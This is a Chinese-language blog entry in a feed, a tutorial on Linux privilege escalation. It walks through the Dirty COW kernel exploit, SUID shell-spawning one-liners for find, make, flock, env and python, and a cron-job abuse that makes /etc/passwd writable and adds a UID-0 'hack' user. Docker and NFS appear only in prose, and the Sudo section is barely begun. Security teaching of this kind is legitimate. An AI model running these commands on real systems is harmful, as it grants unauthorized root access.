    <content type="html"><![CDATA[<h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p>Linux系统处于源码开放状态，多年来被各国的安全从业者发现一系列漏洞，利用其中的一部分漏洞可以直接获取到系统的最高权限。利用内核漏洞进行提权一般包括三个环节：首先，对目标系统进行信息收集，获取到系统内核信息以及版本信息；而后，根据内核版本获取其对应的漏洞以及EXP；最后，使用找到的EXP对目标系统发起攻击，完成提权操作。本文以一个经典的Linux内核提权漏洞-“Dirty COW”来做演示，其信息如下所示：</p><p>漏洞信息：CVE-2016-5195漏洞（Dirty COW，脏牛）</p><p>影响范围：Linux 内核2.6.22 – 3.9 (x86&#x2F;x64)</p><p>漏洞EXP：<a href="https://github.com/FireFart/dirtycow">https://github.com/FireFart/dirtycow</a></p><p>该漏洞的利用方式如下：</p><p>（1）信息收集：通过 uname -a 命令查看内核版本，可见其存在本漏洞</p><p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319212655960.png" alt="image-20230319212655960"></p><p>（2）获取EXP：通过上文的链接将exp下载到本地，使用 <code>gcc -pthread dirty.c -o dirty -lcrypt </code>命令对dirty.c进行编译，生成一个名为dirty的可执行文件。此时查看用户信息，显示当前用户为普通用户</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319212708541.png" alt="image-20230319212708541" style="zoom:75%;" /><p>（3）发起攻击：执行“.&#x2F;dirty  123456”（密码自定义），执行提权。</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319212800755.png" alt="image-20230319212800755" style="zoom:80%;" /><p>根据返回信息的提示，使用“firefart”进行登录，密码为上文设置的密码。查看用户权限，为root权限，提权成功！</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319212817837.png" alt="image-20230319212817837" style="zoom:67%;" /><h4 id="Suid提权"><a href="#Suid提权" class="headerlink" title="Suid提权"></a><strong>Suid提权</strong></h4><p>SUID(设置用户ID) 是赋予文件的一种权限，它会出现在文件拥有者权限的执行位上，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。为可执行文件添加suid权限的目的是简化操作流程，让普通用户也能做一些高权限才能做的的工作。但是如果某些现有的二进制文件和实用程序具有SUID权限的话，就可以在执行时将权限提升为root</p><p>SUID提权的原理与Linux进程的UID有关，进程在运行的时候有以下三个UID：</p><blockquote><p>（A）Real UID：执行该进程的用户的UID       Real UID只用于标识用户，不用于权限检查</p><p>（B）Effective UID（EUID）：进程执行时生效的UID。在对访问目标进行操作时，系统会检查EUID是否有权限。一般情况下，Real UID与EUID相同，但在运行设置了SUID权限的程序时，进程的EUID会被设置为程序文件属主的UID</p><p>（C）Saved UID：在高权限用户降权后，保留的UID</p></blockquote><p>如果某个设置了SUID权限的程序运行后创建了shell，那么shell进程的EUID也会是这个程序文件属主的UID，如果属主为root，便是一个root shell   root shell中运行的程序的EUID也都是0，具备超级权限，于是便实现了提权</p><p>先为进程配置权限，而后实现提权操作</p><ul><li>权限配置</li></ul><p>使用<code> chmod  u+s  progress_test </code>命令为文件配置SUID权限，以 find、make、flock、env、python 为例，配置成功之后拥有者权限的执行位为s</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319214141014.png" alt="image-20230319214141014" style="zoom:60%;" /><ul><li>提权操作</li></ul><p>假设前期的渗透操作已经拿下了一个低权限的用户<code>suid_test</code> , 下面对其提权</p><p>查看本机中拥有<code>suid</code>权限的程序文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure><p>这个命令将从 &#x2F; 目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件</p><ol><li>find</li></ol><p>输入以下命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find . -exec /bin/sh -p \; -quit</span><br></pre></td></tr></table></figure><p>返回shell，可见该进程euid为root，可以读取shadow文件，提权成功</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319213856675.png" alt="image-20230319213856675" style="zoom:45%;" /><ol start="2"><li>make</li></ol><p>输入以下命令返回root shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">COMMAND=&#x27;/bin/sh -p&#x27;</span><br><span class="line">make -s --eval=$&#x27;x:\n\t-&#x27;&quot;$COMMAND&quot;</span><br></pre></td></tr></table></figure><ol start="3"><li>flock</li></ol><p>输入以下命令返回root shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flock -u / /bin/sh -p</span><br></pre></td></tr></table></figure><ol start="4"><li>env</li></ol><p>输入以下命令返回root shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">env /bin/sh -p</span><br></pre></td></tr></table></figure><ol start="5"><li>python</li></ol><p>输入以下命令返回root shell：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27;</span><br></pre></td></tr></table></figure><h4 id="定时任务提权"><a href="#定时任务提权" class="headerlink" title="定时任务提权"></a>定时任务提权</h4><p>定时任务（cron job）是Linux系统中的一个守护进程，用于调度重复任务，通过配置crontab可以让系统周期性地执行某些命令或者脚本。cron 是 Linux 系统中最为实用的工具之一，但是也可能被黑客用于提权操作。由于cron通常以root特权运行，如果我们可以修改其调度的任何脚本或二进制文件，那么便可以使用root权限执行任意代码。本文首先配置一个定时任务，然后利用该任务进行提权。</p><p>（1）定时任务创建</p><p>编写一个脚本test.py ，将其权限置为所有用户可读可写可操作：chmod 777 test.py</p><p>而后修改crontab文件，将定时任务注册到系统中：vim &#x2F;etc&#x2F;crontab，在末尾加上</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/1 *  * * *  root   python  /home/ubuntu/test.py</span><br></pre></td></tr></table></figure><p>表示每1分钟运行一次test.py， 至此定时任务创建成功</p><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230319202622286.png" alt="image-20230319202622286" style="zoom:50%;" /><p>（2）提权操作</p><p>假设通过之前的渗透操作，获得了低权限的用户ubuntu</p><p>查看crontab文件：cat &#x2F;etc&#x2F;crontab，发现存在定时任务，以root身份定时运行&#x2F;home&#x2F;ubuntu&#x2F;test.py。而test.py文件是任意成员可写的，于是向其代码尾部追加以下内容，将<code>passwd</code>文件权限设置为任意成员可写</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.chmod(&quot;/etc/passwd&quot;,stat.S_IRWXU|stat.S_IRWXG|stat.S_IRWXO)</span><br></pre></td></tr></table></figure><p>一分钟之后，程序自动运行，发现<code>passwd</code>已经任意成员可写</p><p>接下来需要做的就是构造一个用户，在密码占位符处指定密码，UID设置为0，并将其添加到 <code>/etc/passwd</code> 文件中</p><p>首先，使用perl语言生成带有盐值的密码： <code>perl -le &#39;print crypt(&quot;hack&quot;,&quot;addedsalt&quot;)&#39;</code></p><p>而后，拼接密码，将以下字符串写入&#x2F;etc&#x2F;passwd文件，之后便拥有了一个超级用户hack：hack</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack:adCP9//qaScc2:0:0:User_like_root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>最后登录hack用户，自动跳转到root用户，提权成功！</p><h4 id="Docker提权"><a href="#Docker提权" class="headerlink" title="Docker提权"></a><strong>Docker提权</strong></h4><p>除了利用Linux系统自带的工具进行提权，还可以利用大量存在风险的第三方工具进行提权，以Docker为例进行演示</p><p>随着云化时代的来临，docker也越来越流行，在很多公司内部的linux机器上docker已然成了标配。Docker使用便捷，有以下几个特性：</p><p>（1）可免sudo使用docker：默认情况下使用docker必须要有sudo权限，对于一台机器多用户使用，往往很多用户只有普通权限。为了让普通用户也可以使用Docker，管理员将需要使用docker的用户添加到docker用户组(安装docker后默认会创建该组)中，用户重新登录机器即可免sudo使用docker了</p><p>（2）容器内用户权限不受限：用户创建一个docker容器后，容器内默认是root账户，在不需要加sudo的情况下可以任意更改容器内的配置。正常情况下，这种模式既可以保证一台机器被很多普通用户使用，通过docker容器的隔离，相互之前互不影响；也给用户在容器内开放了充足的权限保证用户可以正常安装软件，修改容器配置等操作</p><p>（3）容器内外文件可映射：docker提供了一个-v选项，提供用户将容器外的host目录映射进容器内，方便的进行容器内外的文件共享</p><p>结合上面三个特点，可以实现用户提权操作</p><h4 id="NFS提权"><a href="#NFS提权" class="headerlink" title="NFS提权"></a>NFS提权</h4><p>NFS（网络文件系统）是一种分布式文件系统协议，NFS允许系统通过网络与其他人共享目录和文件。在NFS文件共享中，用户甚至程序可以访问远程系统上的信息，就像它们驻留在本地计算机上一样。NFS中的Root Squashing（root_sqaush）参数阻止对连接到NFS卷的远程root用户具有root访问权限。当该参数设置为no_root_squash时，登入 NFS 主机使用分享目录的使用者如果是 root 的话，那么对于这个分享的目录来说，他就具有 root 的权限，基于此原理便可实现提权</p><h4 id="Sudo滥用提权"><a href="#Sudo滥用提权" class="headerlink" title="Sudo滥用提权"></a>Sudo滥用提权</h4><p>sudo没配置密码</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;内核漏洞提权&quot;&gt;&lt;a href=&quot;#内核漏洞提权&quot; class=&quot;headerlink&quot; title=&quot;内核漏洞提权&quot;&gt;&lt;/a&gt;内核漏洞提权&lt;/h4&gt;&lt;p&gt;Linux系统处于源码开放状态，多年来被各国的安全从业者发现一系列漏洞，利用其中的一部分漏洞可以直接获取到系</summary>
      
    
    
    
    <category term="misc" scheme="https://micgo.top/categories/misc/"/>
    
    
    <category term="提权" scheme="https://micgo.top/tags/%E6%8F%90%E6%9D%83/"/>
    
  </entry>
  
</feed>
